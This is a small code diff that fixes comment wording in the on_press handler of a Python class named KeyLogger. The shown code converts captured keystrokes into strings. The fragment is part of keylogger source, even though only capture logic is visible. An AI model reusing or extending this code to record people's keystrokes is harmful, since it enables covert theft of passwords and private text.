@@ -7,9 +7,9 @@ class KeyLogger:
 
     def on_press(self, key):
         try:
-            # Turn the key insto a string
+            # Turn the key into a string
             current_key = str(key.char)
-        # If the key is not a letter/number
+        # Behaviour when the key is not a letter/number
         except AttributeError:
             if key == key.space:
                 current_key = " "
